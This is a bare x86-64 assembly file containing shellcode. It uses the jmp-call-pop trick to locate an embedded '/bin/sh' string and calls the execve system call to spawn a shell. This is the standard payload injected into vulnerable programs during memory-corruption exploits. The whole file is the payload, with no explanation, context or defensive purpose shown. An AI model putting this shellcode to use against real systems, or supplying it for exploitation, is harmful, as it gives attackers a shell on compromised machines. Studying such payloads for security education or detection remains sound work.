.section .text

.globl _start

_start:

xorq %rax, %rax

pushq %rax

jmp end

hop:
popq %rbx
pushq (%rbx)
movq %rsp, %rdi
movq %rax, %rsi
movq %rax, %rdx
movb $59, %al

syscall


end:
call hop
.ascii "/bin/sh\0"
